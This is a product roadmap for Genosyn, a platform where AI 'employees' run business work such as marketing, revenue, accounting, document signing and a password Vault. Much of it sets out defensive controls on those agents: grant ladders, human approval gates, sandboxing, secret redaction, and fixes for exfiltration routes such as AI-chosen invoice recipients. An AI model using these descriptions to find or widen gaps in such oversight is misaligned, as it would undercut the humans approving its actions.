The Campaign / Creative workspace and autonomous operating loop shipped in
M35. Native provider mutations remain deliberately limited to pause / enable /
budget: platform-side Campaign and Creative publishing uses a granted guarded
MCP server or the approval-gated browser, which also covers LinkedIn, X and
TikTok without pretending their review-gated APIs are self-service. Audience /
PII uploads and FX conversion for caps remain deferred.

---

### M30 — Tool surface (progressive disclosure) ✅

The agent-facing tool list grew by a family per feature and was re-sent on every
step: ~21,600 tokens per request before an employee had a single Integration.
Adding a feature made every unrelated turn more expensive and gave the model
more to sift through. Tools are now split into a working set the model is shown
and a catalogue it searches, which takes the per-step cost to ~4,500 tokens and
decouples it from how many features Genosyn has.

- [x] Resident/deferred partition, built once per run and never mutated, so the
      tool payload stays byte-identical across a run's steps
- [x] `find_tools` (search the catalogue, get exact schemas) and `call_tool`
      (run anything in it), with an always-on catalogue footer on every result
      so a missed search still shows the employee what exists
- [x] Curated keyword index (`toolIndex.ts`) — descriptions alone are not a
      retrieval surface: "spreadsheet" matched none of the 104 tools
- [x] Lenient dispatch — resolution reads the whole registry, only advertising
      reads the working set, so naming a deferred tool directly just works
- [x] Collapsed CRUD families retired; the model sees the 101 granular tools
      with their real schemas instead of unions whose `required` had decayed
      to `["op"]`. `finance` and `mail` were the two heaviest tools in the
      whole surface
- [x] The 15 retired family names survive as hidden aliases — free, invisible,
      and load-bearing, because customer Skills have been told to call
      `base_rows` with an `op` for the product's whole life
- [x] Grant-dead tools ranked down and annotated in search results, never
      filtered (`create_base` auto-grants its creator mid-run)
- [x] Per-Skill declared toolsets — `Skill.toolsetJson`, picker under
      Settings → Tools, loaded up-front so a known procedure never searches
- [x] One `composeEmployeeSystemPrompt` / `toolsBriefing` for both seams, with
      the tool enumeration generated from the domain index rather than typed
      out twice and left to drift
- [x] Budget ceiling test on the working set (count, total chars, per-tool
      chars) wired into CI, plus a 30-query recall gate on the keyword index
- [x] `config.agent.toolDiscovery.enabled` as the revert path
- [ ] Small-model eval (7–13B behind Ollama) that `args_json` survives Jinja
      template rendering and grammar-constrained decoding without arriving
      empty — the recall risk this design carries is unmeasured against a model
- [ ] Anthropic prompt caching on the now-stable per-run tool prefix
- [ ] Anthropic-native `tool_search_tool_regex` as a second rendering on
      Anthropic models, once the billing question for deferred definitions is
      settled

### M31 — App-wide live sync ✅

Workspace chat, the notifications bell, the Mail mirror, and the browser
live-view already rode the per-company WebSocket hub (M9 + M28). Every other
surface still loaded once and went stale: a routine finishing, an AI employee
moving a todo or posting a work-report comment, an invoice being sent, a base
record being written — none of it showed up until the human refreshed. Since
AI employees act on their own schedule, "is anything happening?" too often
meant reloading the page. This milestone makes essentially every content list
and detail page refresh itself the moment its data changes, reusing the socket
that already exists rather than adding polling.

- [x] **One server choke-point.** A single TypeORM `EntitySubscriber`
      (`server/db/subscribers/resourceChangeSubscriber.ts`) turns every content
      write — from HTTP routes, MCP tools, cron, pipelines, mail sync, anywhere
      — into a coarse `resource.changed` event. A declarative registry maps each
      entity to a client `kind` and resolves its company directly
      (`entity.companyId`) or by walking one immutable parent hop
      (Run→Routine→employee, Todo→Project, BaseRecord→BaseTable→Base), memoized.
      No route handler has to remember to emit.
- [x] **Coarse on purpose, like `mail.updated`.** The frame carries only a
      `kind` and the set of parent `scopeIds` touched — never row data. Open
      pages refetch through the normal authorized routes, so nothing sensitive
      rides the socket and project / channel / grant access is re-checked on
      every refetch. Writes coalesce per `(company, kind)` on a short debounce
      (`server/services/resourceEvents.ts`), so a bulk import collapses to one
      frame instead of hundreds.
- [x] **Cross-replica for free.** `resource.changed` fans out through the same
      `broadcastToCompany` path as chat, so on Postgres a write on one replica
      refreshes pages served by another (M28). The subscriber skips the
      `RealtimeEvent` fan-out row itself, so there is no broadcast loop, and it
      is inert until the socket layer registers its sink at boot — nothing
      written during migrations broadcasts.
- [x] **One client hook.** `useLiveRefetch(kinds, reload, scopeId?)`
      (`client/components/CompanySocket.tsx`) subscribes to the shared company
      socket and re-runs a page's existing loader (debounced) when a matching
      kind arrives. Wired into ~90 list and detail surfaces across AI, Tasks,
      Finance, Notes, Bases, Explore, Customers, Code, Pipelines, Resources,
      Approvals, Audit, Usage, Settings, and the employee tabs. High-frequency
      boards (routine runs, the todo board, base grids) pass a `scopeId` so a
      change to one parent doesn't refetch the others.
- [x] **Editors never clobber.** Detail pages whose editor buffer is bound to
      loaded state (Notes, Skills, routine briefs, Resources, dashboards) either
      subscribe only their sidebar/tree refresh, key their draft on the record
      id so a same-id refetch can't reset it, or guard the live reload to
      no-op while editing. The chart editor is deliberately not wired.
- [x] **Already-live surfaces untouched.** Workspace chat, notifications, and
      the Mail mirror keep their existing, richer events; the subscriber skips
      those entities so nothing double-fires. Instance-scoped Admin pages
      (`/api/admin/*`) are out of scope — the socket is per-company.

### M32 — Revenue (AI-native go-to-market)

Genosyn already tracked what a company spends to get attention (M26 paid
marketing) and what it collects once somebody signs (M19 finance). M32 added
the operating middle: `Contact` is the person, `Customer` is the company
account from prospect through billing, and `Deal` is the money still being won.

This milestone is that middle, and it closes the loop — **ad click → contact →
deal → invoice → collected cash → ledger entry, in one database, worked by AI
employees, with humans approving what matters.** No other tool has the whole
chain in one place: CRMs do not have the ledger, ledgers do not have the
pipeline, and the PQL tools have neither.

- [x] **The spine.** `Contact` (a person, with a nullable `customerId` so they
      can exist long before an account does), `DealStage` (a flat ordered list —
      *not* a "pipeline", see AGENTS.md), `Deal`, `DealContact` (the buying
      committee), and `Activity` (the unified timeline). `Customer` stays the
      account, so contracts, statements and the invoice chain keep working
      untouched. Existing `customer_contacts` rows are copied into `contacts` by
      an idempotent boot backfill; no data is destroyed.
- [x] **Complete Revenue operations.** One follow-up queue across assigned
      task activities, deal dates and partnership dates; `Customer` enriched
      into the prospect-through-billing account with firmographics and
      ownership; typed custom fields with exact filtering; controlled deal
      sources and committee/partnership classifications; formal document
      relationships; native `Partnership` records with primary and Reply-All
      contacts; and Base plus direct CSV/JSON/NDJSON imports with dry run,
      duplicate preview, durable source-row mapping, guarded rollback and
      reconciliation reports. Every
      service is exposed through granular deferred AI tools behind
      `EmployeeRevenueGrant`; Base imports additionally require a grant to the
      source Base.
- [x] **Safe Account consolidation.** Revenue Accounts can be archived and
      restored without losing history, or transactionally merged into an
      active destination after a counted preflight and exact-name
      confirmation. The merge reparents both Revenue and Finance references,
      preserves issued document identities, keeps destination fields and
      conflicting custom values, copies missing custom values, archives the
      source, and is available to AI Employees with Revenue write access.
- [x] **The timeline fills itself.** Mail sync matches thread participants
      against known contacts and writes `email_in` / `email_out` activities, so
      opening a Contact shows every conversation you have ever had with that
      person without anybody doing data entry. It links only to contacts that
      *already exist* — auto-creating one per stranger would bury the list in
      newsletters and receipts within a week.
- [x] **Deliverability and compliance, before volume.** `Suppression` enforced
      at the mail send choke-point (both `sendMailMessage` and `sendMailDraft`,
      re-checked at send rather than at draft time), RFC 8058 `List-Unsubscribe`
      + one-click POST, a public unauthenticated unsubscribe endpoint, and
      per-account send throttling. Bulk send without this burns a customer's
      sending domain, and the damage is not reversible.
- [x] **Sequences.** Multi-step outbound where each touch is drafted
      individually by a named AI Employee from that contact's real context —
      prior threads, the open deal, the signal that triggered enrolment — rather
      than interpolated from a template. Drafts land in the existing review
      queue and a human presses Send; `autoSend` requires the revenue grant at
      `send` **and** the mail account grant at `send`. Suppression, send windows
      and daily caps apply either way. Replies stop an enrolment within a
      heartbeat, because mail sync already ingests them.
- [x] **Signals — the SaaS-specific piece.** A saved query over a connected
      product database or Stripe, evaluated on a cron, deduplicated by a unique
      `(signalId, dedupeKey)` index so a trigger fires once per account rather
      than every tick. Firing routes to an activity, a notification, a new deal,
      a sequence enrolment, or an AI employee. Built on the Explore executor and
      the existing scheduler rather than a new engine.
- [x] **Revenue metrics.** MRR movement (new / expansion / contraction / churn /
      reactivation), ARR, NRR and GRR cohorts, CAC by channel, LTV:CAC, payback,
      pipeline coverage, win rate, sales-cycle length and stage conversion. All
      arithmetic is pure and property-tested; the waterfall is guaranteed to add
      up. CAC currently reads `AdSpendEvent`, which records *authorized budget
      changes* rather than settled spend — that is a documented proxy, and
      reading real spend from the ad platforms is the obvious follow-up.
- [x] **`EmployeeRevenueGrant`** at `read` < `write` < `send`, managed from
      **Revenue → AI access**. An employee with no grant gets no revenue tool at
      all, matching the finance default.
- [x] **Revenue section** at `/c/<co>/revenue` — insights, follow-ups, the deal
      board, accounts, contacts, partnerships, sequences, signals, imports,
      controlled classifications, custom-field setup and AI access.
- [x] **Revenue administration and migration completion.** Give Members and AI
      Employees the same service-backed administration surface for Deal Stages,
      controlled classifications, typed custom-field definitions, Sequences,
      Signal definitions and event history, formal-document lifecycle, Contact
      ownership, and manual Activity correction. Add company-wide Activity
      search/export, durable import-report lookup, a transactional Base or
      CSV/JSON/NDJSON importer that splits each source row into a linked Account,
      Contact and Deal, and a reconciled pass for Base record attachments.

#### M32.1 — Revenue data quality and historical truth

Ordered so cleanup writes have reversible identity semantics before reporting
or enrichment trusts the resulting records:

- [x] **Core-record consolidation.** Audited merge/archive/undo for Accounts,
      Contacts, Deals, and Partnerships. Members select the survivor, preview
      field and relationship conflicts, reassign timelines, follow-ups,
      documents, committees and custom values, preserve aliases and imported
      source IDs, and leave a redirecting tombstone instead of deleting the
      duplicate. Archive and restore are symmetrical for all four resources;
      merge tombstones can only be restored through guarded undo.
- [x] **Bulk Revenue operations.** Selected-ID or filter targeting for owner,
      lifecycle/status, allowed standard fields, custom fields, follow-up and
      archive changes, with a dry run, per-row validation, idempotent commits,
      partial-failure reporting, durable audit history and guarded rollback.
      Deal amount, owner and expected-close bulk changes append immutable
      history. The follow-up queue adds
      assignee/unassigned, priority, resource, status, due/staleness and Deal
      state filters plus complete/cancel/reassign/reprioritize/reschedule bulk
      triage.
- [x] **Historical Deal truth.** Import original creation/close timestamps and
      ordered stage, amount and owner changes as immutable historical events.
      Funnel reporting becomes transition/cohort based: entered/progressed,
      period wins/losses, original-cohort conversion, median time in stage and
      median sales cycle, with explicit complete/partial/missing history
      coverage for pre-history imports. A Deal-level coverage inventory links
      migration batches to each ledger, and Activity repair requires an explicit
      selected-Deal preview so a migration-time Activity cannot be mistaken for
      an original lifecycle boundary.
- [x] **Controlled enrichment.** Provenance-backed, reviewable proposals for
      canonical Account domains and Deal commercial value. Domain evidence
      rejects public mailboxes, resolves aliases/subdomains and safely follows
      redirects without overwriting verified values. Value evidence normalizes
      currency, recurring cadence, seats, ARR/MRR/ACV, source and confidence
      from Stripe, Finance, Account ACV, proposals/quotes and confirmed terms.
      An actionable zero-value Deal backlog scopes proposal work; commercial
      values require human review and stale proposals are refused.
- [x] **Revenue document capture.** Scan current and historical Gmail
      attachments, classify commercial documents, propose Account/Contact/Deal/
      Partnership links, deduplicate by source message and file hash, preserve
      provenance, and require review when a link is ambiguous. New Gmail
      messages generate candidates automatically during sync; the manual scan
      remains for historical mail.
- [x] **Exports, scalable reconciliation and duplicate candidates.** Complete
      paginated snapshots for every core Revenue resource; summary/filter/
      lookup/download and separately paginated row decisions for import
      history; immutable Deal history, field evidence, duplicate candidates,
      operation audit and document-candidate exports; and an ongoing
      exact/aliased-domain, normalized-name, email, Stripe-ID, redirect and
      same-Account Deal-title duplicate report. Duplicate scans run at boot and
      every six hours, feed the merge workflow, and never merge automatically.
- [ ] Real ad-platform spend for CAC (replacing the `AdSpendEvent` proxy)
- [x] Calendar-based activities — shipped as **M44**, which mirrors the
      calendar and writes `meeting` activities onto the Contact/Deal/Account
      timelines. Booking a meeting is still the `calendar_create_event` tool
      rather than a native scheduler; that earns its complexity later
- [~] **Bring-your-own-key firmographics.** Shipped against People Data Labs,
      then **removed in 1.132.0** with that connector. It was the only
      implementer of the `lookupCompanyFirmographics` provider hook, so the
      hook, the Revenue firmographics service and its review surface went with
      it. An enrichment key now lives in the Vault; re-introducing enrichment
      means designing it for more than one vendor.
- [ ] A second sales process per company (one nullable `processId` when asked)

### M35 — Autonomous Marketing agency ✅

Turn the safe paid-media levers from M26 into a complete operating system for
an AI-run ad agency. The external ad platform remains the source of truth for
delivery and settled spend; Genosyn is the source of truth for strategy,
Creative decisions, experimentation, delegation, and the evidence carried from
one Routine run into the next.

- [x] **Marketing workspace.** A first-class `/marketing` section with a command
      center, Campaign briefs and lifecycle, Creative review, falsifiable
      Experiments, and explicit AI access. Empty/loading/error states and
      responsive contextual navigation are included.
- [x] **Campaign policy.** Every Campaign records objective, audience, offer,
      landing page, KPI/target, planned daily budget, external account/Campaign
      ids, owning AI Employee, and one of `observe < optimize < autonomous`.
      Ready/active transitions validate the brief; active refuses an unlinked
      platform Campaign; autonomous refuses an unowned Campaign.
- [x] **Creative system.** Testable text/image/video/carousel/responsive
      variants move through draft → review → approved/active → retired, keep
      reusable concept/copy/review notes, and link to company-controlled assets
      instead of putting binary data in the database.
- [x] **Experiment discipline.** A test compares at least two Creative variants
      from the same Campaign, declares its hypothesis, primary metric and
      minimum sample before running, and cannot be decided without a winner
      from the tested set plus a recorded rationale.
- [x] **Real performance snapshots.** Immutable per-Campaign platform readouts
      capture settled spend, impressions, clicks, conversions and conversion
      value for an exact period. This is distinct from `AdSpendEvent`, which
      remains the append-only ledger of authorized budget changes.
- [x] **AI delegation.** `EmployeeMarketingGrant` adds `read < write < operate`.
      Twelve granular deferred tools let Routines inspect the dashboard, manage
      Campaigns/Creative/Experiments, and record performance. Operate access
      never confers platform credentials: a separate Connection Grant plus the
      M26 caps, kill switch and Approvals still gate every external action.
- [x] **Autonomous loop.** The Performance Marketer template now carries an
      agency operating Skill and a daily optimization Routine that observes
      the platform, decides against the Campaign policy, acts only through
      guarded external tools, and records the evidence and decision.
- [x] **Docs and tests.** Paid Marketing docs now lead with the in-app Marketing
      flow and explain the two-lock access model, native vs guarded
      browser/MCP publishing, and the immutable performance record.

### M36 — AI-native document signing ✅

Send a PDF to customers for electronic signature without handing the document
or its commercial context to a separate SaaS. Genosyn owns the source bytes,
recipient routing, completed PDF, evidence, customer relationship and the AI
Employee workflow in one company-scoped system.

- [x] **Signing requests.** A first-class Signatures section for PDF upload,
      customer linkage, parallel or ordered signers, copy recipients, expiry,
      messages, field placement, draft duplication and lifecycle tracking.
- [x] **Recipient experience.** A focused session-free signing page reached by
      a high-entropy, database-hashed bearer link. Signers review the exact
      source PDF, consent to electronic records, complete required text,
      checkbox, name, email, date, initials and typed or drawn signature fields,
      or decline with a reason. Sent requests are immutable.
- [x] **Evidence and archival.** Stamp completed values into the PDF, append a
      human-readable completion certificate, retain original/completed SHA-256
      fingerprints and an append-only hash-chained event trail, capture consent,
      timestamps, IP and user agent, email every party a completed copy, and
      automatically archive the result as a signed Customer Contract.
- [x] **Delivery controls.** Company transactional email sends requests,
      completion copies and manually-triggered reminders. Ordered routing only
      activates the next signer group after the prior group completes; void,
      decline, delivery failure and expiry remain visible and auditable.
- [x] **AI delegation.** `EmployeeSigningGrant` gates `read < draft < send`.
      Granular deferred tools let AI Employees inspect signing work, prepare a
      request from a granted PDF Resource, configure recipients/fields, send,
      remind and void. External delivery requires explicit `send` access; every
      AI mutation writes both AuditEvent and JournalEntry evidence.
- [x] **Docs, security and tests.** Document the in-app flow, self-hosting
      requirements and the distinction between evidence-backed electronic
      signatures and certificate-backed qualified signatures. Cover lifecycle,
      tenancy, token hashing, immutable state, routing, PDF rendering, audit
      verification, AI grants and public signer endpoints with automated and
      real-browser tests.
- [x] **Guided signing usability.** Explain the AI access ladder in plain
      language, confirm before granting autonomous customer-contact access, make
      the AI handoff save first and let the Member choose an employee, and state
      its real boundary: AI can inspect saved configuration and evidence or
      prepare a new request from a PDF Resource — shared with it, or since M47
      filed by it from an email attachment — but cannot read the source PDF
      through signing tools, edit an existing draft, or sign. Keep
      multi-signer field ownership obvious with recipient-specific colors and
      names, support direct pointer, touch and keyboard field resizing, and send
      clear company-branded invitation, reminder and completion emails.

### M37 — AI-native Vault ✅

Treat credentials as governed company resources, not prompt text. The Password
Vault is deliberately separate from the existing `Secret` environment-variable
store: Members use Vault items explicitly, while AI Employees receive
item-level Grants and pass plaintext only across narrow server-side action
boundaries.

- [x] **Dedicated Vault data model.** `VaultItem` stores a company-scoped
      login, API key, or secure note with `company | restricted` visibility and
      human/AI creator attribution. Title, username, secret, website URL, and
      private notes live together in one scoped AES-256-GCM payload rather than
      plaintext metadata columns. `Secret` remains the separate environment
      Secrets entity used by coding tools and Pipelines.
- [x] **Member password manager.** A first-class responsive `/vault` surface
      supports search and type filters, strong-password generation, create,
      inspect, edit/rotate and delete flows, plus explicit reveal and copy.
      Editing never loads the existing secret into the form.
- [x] **Human item access.** `VaultItemMemberAccess` adds `view < edit` to
      restricted items. Company-visible items are viewable by all Members;
      restricted items are undiscoverable without access. The creator and
      company owners/admins manage visibility, sharing and deletion.
- [x] **Default-deny AI Grants.** `EmployeeVaultGrant` adds item-level
      `use < manage`. Company visibility never implies AI access, safe
      discovery returns only granted metadata, and every sensitive use
      re-checks the live Grant so revocation fails closed. Manage permits safe
      login-metadata maintenance while preserving the saved website origin;
      it never permits website rebinding, plaintext read, password rotation or
      deletion.
- [x] **Server-side browser use.** `list_vault_items` returns no password,
      API-key value, or secure-note body. `browser_fill_vault` resolves one
      granted username or Login password inside the App and fills App-owned
      Chromium only when both the top page and target frame match the saved
      website origin exactly (scheme, host and port). A stored password can go
      only into an input with `type=password`; API-key and secure-note values
      have no Browser-fill sink. Browser enablement and the host allow list are
      intersected with the Vault checks, so a Grant cannot widen Browser policy.
      Password-input values are redacted from model snapshots, and screenshots
      are refused after the session observes or fills a password;
      plaintext never enters model output, Run transcripts, audit detail, or
      logs. AI Employees in acknowledged host mode receive only path-confined
      file/search tools;
      unrestricted `bash` is available only behind the bubblewrap boundary, so
      a zero-Grant employee cannot bypass Vault policy through the App filesystem
      or sibling process tokens.
- [x] **AI-native login creation and capture.** `create_vault_login` generates
      and encrypts a strong password server-side in a company-visible item.
      `browser_save_vault_login` requests mandatory company-owner/admin approval
      before capturing a same-origin password input into a restricted item bound
      to the exact current origin. Both paths return no secret and atomically
      give the creating AI Employee a `manage` Grant; every other AI Employee
      remains denied, and a captured restricted item stays hidden from ordinary
      Members until its human access is changed.
- [x] **Autonomous login MFA.** A Login's encrypted payload can additionally
      retain one TOTP authenticator and multiple App-Browser software passkeys
      without adding plaintext columns or reusing Members' own 2FA rows. An AI
      Employee can capture a setup key or QR code into a Login it created,
      generate and fill the current code only at the exact saved origin, and
      create or use a Chrome virtual-authenticator passkey in one bounded action
      tied to the exact origin, selected site control, and WebAuthn RP ID. TOTP
      enrollment is armed before the site reveals it; approval-gated submission
      generates its current code only after the Approval is claimed. TOTP seeds,
      live codes and passkey private keys never enter model output, Run
      transcripts, screenshots, recordings, audit metadata or logs; passkey
      assertions persist their counters under an encrypted, tokenized per-key
      lease. These governed actions are App-Browser-only and never reach a Member
      browser's personal password manager, biometric or hardware key.
- [x] **Audit, docs and tests.** Human reveal and copy are separate audit
      events with no secret content; item, sharing, Grant and AI-use mutations
      retain actor evidence. Dedicated `/docs/vault` guidance distinguishes
      Password Vault items from environment Secrets and documents Browser
      autofill/capture. Automated service, route, tool-policy and browser
      coverage exercises tenancy, access levels, revocation, encryption,
      exact-origin/frame binding, password-only sinks, approval, redaction and
      plaintext non-disclosure.

### M59 — Vault sources (Bitwarden and Vaultwarden) ✅

A company that already runs a password manager should not keep the same
credential in two places. M37 gave Genosyn a Vault of its own; this makes that
Vault able to read someone else's. Issue #11 asked for it in the self-hosted
case — a Vaultwarden beside a Genosyn install — and that is the case the design
is aimed at.

- [x] **A Vault source is not an Integration.** `VaultSource` is a company's
      connection to an external password manager, connected at Vault → Connect a
      Vault source and admin-gated. Modelling it as an Integration Connection
      was rejected deliberately: a Connection is granted to an AI Employee
      wholesale and must declare tools, whereas the entire point of the Vault is
      per-item `use < manage` Grants — and 1.132.0 spent a milestone moving
      credentials *out* of connector configs and into the Vault.
- [x] **Mirrors, not copies.** Each external item gets an ordinary `VaultItem`
      row carrying its title, username and website and **no secret**, marked
      with `vaultSourceId` + `externalItemId`. Human Access, AI Grants, reveal
      auditing, the exact-origin Browser fill and Run redaction therefore apply
      to a Bitwarden credential with no second implementation. Listing, sharing
      and Grant management never touch the network, so the Vault page still
      works when the external server is down.
- [x] **The secret is fetched when it is used.** Reveal, copy, `browser_fill_vault`
      and authenticator codes resolve one item live from the source. The website
      URL deliberately stays the mirrored value even then: it is the origin the
      Browser may type the credential into, and an edit made in Bitwarden must
      not retarget a fill already in flight. A URL change arrives through a sync,
      which is a reviewable event.
- [x] **The Bitwarden protocol, implemented in-process.** `lib/bitwarden/`
      speaks the password-manager API the official clients and Vaultwarden
      share: prelogin, PBKDF2 or Argon2id master-key derivation, the
      HKDF-Expand-only key stretch, AES-256-CBC-HMAC-SHA256 `EncString`s,
      RSA-OAEP organization keys, and per-item cipher keys. No `bw` binary, no
      CLI harness, no credential directory on disk. Argon2id needs `hash-wasm`
      — a zero-dependency WASM build, so the multi-arch image needs no native
      toolchain.
- [x] **Read-only, and honest about it.** Genosyn never writes to the external
      vault: editing, rotating and deleting happen there, and the next sync
      brings the change across. Logins and Secure notes cross over; cards,
      identities, SSH keys and trashed items do not, and the sync reports what
      it skipped. Visibility stays editable here because it is Genosyn's own
      access policy, not the credential.
- [x] **Sign-in that survives being headless.** A Bitwarden API key is the
      recommended credential because an API-key grant skips both two-step login
      and new-device verification; the password grant works too, with a stable
      device identifier and a remembered second factor. An SSO or key-connector
      account has no master-password unlock and is refused with that reason
      rather than a decryption error.
- [x] **Reachability is a decision the operator makes.** Outbound requests to a
      Vault source are checked like every other outbound surface, so a company
      admin cannot aim Genosyn at the host's own network — and a company admin
      is not the operator, since anyone who can sign in can create a company and
      own it. A Vaultwarden on a private address is reached by naming its
      hostname in `security.outboundPrivateHostAllowlist`; the failure says so.
- [x] **Sync on a timer and on demand.** A 15-minute leased background pass
      keeps mirrors in step, and Sync now forces one. Items that disappear from
      the source are removed here along with their Access and Grants, so a
      recreated item cannot silently inherit an old Grant.

### M33 — AI-native accounting

Make the whole finance module operable by an AI Employee, safely — not
just accounts receivable. Today an AI can run AR and stage a category
review; it has no tools for AP, bank feeds, reconciliation, card
expenses, periods/close or tax, and several of those are impossible for
a human too until the underlying gaps close (a bank line cannot post to
the ledger at all). The shape is **job-shaped tools, all deferred behind
`find_tools`/`call_tool`** (a measured ~16 names fits the tool-budget
footer; full CRUD parity does not), gated by the existing
`read < invoice < full` ordinal plus an orthogonal default-off scope
allowlist, where money movement and final approval stay with humans and
every AI-authored ledger effect is either posted by a service whose
actor type makes an AI money-out posting a compile error, or a
`FinanceProposal` a human applies.

Ordered so each increment is independently green and releasable, and so
the functional prerequisites land before the tools that need them:

- [x] **A0 — Harden the shipped surface.** Close the `send_invoice`
      recipient-exfiltration channel (AI-supplied To/Cc restricted to the
      customer's own domain and the owner-curated always-Cc mailboxes),
      audit `update_customer` email repoints, make `requireFinance` fail
      closed on an unknown level, and company-scope the reconciliation
      payment lookup. Shipped in 1.48.1.
- [x] **A1 — Bank categorization (humans).** A bank-feed line can be posted
      to the ledger for the first time: from Reconcile, pick a category and
      Genosyn posts a balanced entry (money in DR bank / CR category; money
      out reverses) and marks the line reconciled; unmatch reverses it.
      New `bank_categorization` / `bank_categorization_void` sources; no
      migration. Home-currency only for now. Closes P1 — the prerequisite the
      rest of the milestone rested on, and the original "bank feed never posts
      to the ledger" gap. Shipped in 1.53.0.
- [x] **A2 — Reconciliation beyond invoice payments (humans).**
      `findMatchCandidates` now also surfaces posted ledger entries carrying a
      line on the feed's bank account — bill payments, card settlements,
      refunds, manual journals — the whole money-out side that invoice-payment
      matching alone could never reach. Ranked by amount + date like the
      payment path; already-claimed entries and `invoice_payment` /
      `bank_categorization` sources are excluded so nothing is offered twice,
      and the sweep runs even when the company has no invoices. Reconcile
      matches either candidate kind (`paymentId` or `ledgerEntryId`). Reuses the
      existing `matchedLedgerEntryId` + `manualMatch`; no migration. Shipped in
      1.54.0.
- [x] **A3 — The proposal spine (maker-checker).** New `FinanceProposal` entity
      + `services/financeProposals.ts`: a staged finance mutation is validated
      and stored but never executed at create time — it sits `pending` until a
      human `apply`s it (dispatched by `kind` to the real finance service, which
      re-checks balance / live accounts / open period) or rejects it. First
      kind: `journal_entry`. For humans this is segregation of duties — one
      member hits `Propose for review` on the Journal composer, another applies
      it from the new `Finance → Proposals` queue; nothing touches the ledger
      until they do. It is also the substrate every AI-authored ledger effect
      will post through in the tool increments (AI proposes, a human applies),
      with apply/reject audited. Modelled on `Approval`; kind-agnostic queue,
      apply gate and audit fields. Migration pair, no data backfill. Shipped in
      1.55.0.
- [x] **A4 — Read-only finance role (humans).** A per-member `financeAccess`
      level (`none` / `read` / `full`) on `Membership`, orthogonal to the org
      role — owners/admins are always effectively `full`; it only restricts
      regular members. Enforced by wrapping the finance router's verb methods so
      every finance route carries the gate automatically (GET needs ≥ `read`,
      mutations need `full`) without repeating it on ~130 routes or polluting the
      sibling routers that share the `/api/companies/:cid` mount; `cardExpenses`
      is wrapped the same way. Owners/admins set a member's level from
      `Settings → Members`, audited. Defaults to `full`, so nothing changes until
      someone is dialled down. Middleware unit tests; migration pair. Shipped in
      1.56.0. Fast-follow: hide the finance nav for `none` members (today they
      see it and get 403s).
- Next: the grant-scope layer (an orthogonal default-off scope allowlist for AI
  finance tools) + human-side audit coverage; then the job tools themselves
  (read, bank, AR, AP, close), each proposal-only until an owner raises a
  per-company limit.
- Depends on M19 Phase H (credit notes / refunds) for the AR correction
  tools. Multi-currency bank lines and a tax-return figure are named but
  out of scope.

### M34 — In-app Help ✅

- [x] Global **Help** action in the app shell, reachable from every company
      page and through the command palette / `G Q` navigation chord.
- [x] Ask any company AI Employee; Help conversations persist per employee and
      stay isolated from ordinary direct-chat history and prompts.
- [x] Help-specific system context covers Genosyn vocabulary, user workflows,
      architecture, documentation, roadmap, deployment, and troubleshooting.
- [x] The App image ships the exact Genosyn repository snapshot for its release
      (App, Home, CLI, docs, roadmap, and workflows). Help gives the selected
      employee resident, read-only list/search/read tools over that snapshot so
      code-level answers can be verified and cite source paths without stuffing
      the whole repository into every model request.
- [x] User documentation at `/docs/help`, including the boundary between
      read-only product Help and ordinary AI Employee Chat.

### M39 — Decision Stack ✅

An AI employee that reaches a fork it should not take alone had two options,
and both were bad: guess, or stop and hope somebody reads the journal. In a
Routine there was nobody to ask at all — the brief was written hours earlier
and the run has no interlocutor. So employees guessed, and the guesses that
mattered were the ones nobody saw until afterwards.

The Decision Stack is the third option. The employee does the work up to the
fork, writes the question and the exact choices it will act on, and stops. A
human presses one. The answer reaches the employee through its journal, which
is already injected into every prompt it runs.

- [x] **`Decision` is its own entity, not another `Approval.kind`.** An
      Approval is the system interposing on an action the employee already
      attempted, and the server replays that action on ✓ — which is why it is
      binary, admin-gated, and redacted at every boundary. A Decision is the
      employee choosing to stop: it authors the question and up to six options,
      answering one fires no side effect, and an ordinary Member can answer it.
      Collapsing the two would have put a privileged replay path and an
      everyday question behind the same button. Anything privileged the
      employee does afterwards still meets its own Approval.
- [x] **The employee raises it explicitly, and only when it should.**
      `request_decision` is resident in the working set rather than deferred
      behind `find_tools`: a model that has hit a fork it should not take alone
      is not in a state where it thinks to go looking for permission to stop.
      Its read-back partners, `list_decisions` and `cancel_decision`, defer.
      The briefing spends its sentence on the discipline — ask when a human's
      judgement changes what happens next, not for permission to do the job.
- [x] **The stack is the first thing on Home.** Above the failure alert, and
      deliberately: a failed routine already happened, a pending decision is
      work not happening yet. Each row carries the drafted text one click away
      and a button per option. It renders nothing when empty. `/decisions`
      holds the full list plus what was decided and why.
- [x] **Answered exactly once, by someone allowed to.** The pending→terminal
      write is a conditional UPDATE, so two tabs or two people in a standup
      produce one answer and one 409. `optionId` is matched against the stored
      options, so an employee can branch on `chosenOptionId` without
      re-validating. A decision raised for a named Member is answerable by them
      or by an owner/admin, so nothing strands behind someone on holiday.
- [x] **Model-written copy is scrubbed at the boundary**, through the same
      redaction the approvals inbox uses, so a title quoting a header it read
      cannot turn the stack into an exfiltration path. The same pass closed a
      live gap next door: Home was returning raw approval titles and Vault
      capture rows to any Member, while `GET /approvals` refused them.
- Next: let a human's answer resume the employee's run directly rather than
  waiting for its next scheduled turn. The journal delivery is durable and
  needs no scheduler, which is why it shipped first.

### M40 — PDF forms with no fields ✅

`fill_pdf_form` can only set fields a document already declares, and most
forms in the world declare none. A supplier onboarding form, a tax form, a
bank mandate — printed, scanned, or exported from a word processor — is ink,
not an AcroForm. An employee handed one could read its text and nothing else,
so the best it could do was retype the answers into an email and ask a human
to fill the real thing. That is the task it was given, handed back.

So the pair that works on fields gets a pair that works on coordinates: find
where the printed labels sit, then draw the answers over the original. What
the counterparty receives is their own document, completed.

- [x] **`read_pdf_layout` reports where the text is, not just what it says.**
      Each page's displayed size and rotation, and every run of printed text
      with its position, width, baseline and point size. Runs a content stream
      split for kerning are stitched back together, because a model looking for
      the label `Full name:` will not find `Full`, ` name`, `:` — while a gap
      wide enough to write in is deliberately left as a gap, since that gap is
      the thing the caller came for.
- [x] **`overlay_pdf_text` draws text and tick marks at those coordinates**,
      keeping the source pages as the background so nothing about the original
      is re-rendered. Marks are stroked as geometry rather than set as a
      character: a tick is not in WinAnsi, and the faces that carry one
      disagree about where it sits in its em box, which is the wrong thing to
      discover inside a pre-printed checkbox.
- [x] **One coordinate system, and it is the reader's.** Points from the
      top-left of the page as displayed, `/Rotate` already applied. Both tools
      speak it, so a position read from one can be handed straight to the
      other, and either anchor — the top of the line box or the baseline —
      round-trips exactly. `services/pdfGeometry.ts` owns the conversion into
      the unrotated, bottom-left space PDFs actually draw in, and the signature
      editor now shares it rather than keeping a second copy of the same four
      rotation cases.
- [x] **Refuse before drawing, warn after.** A page that does not exist, a
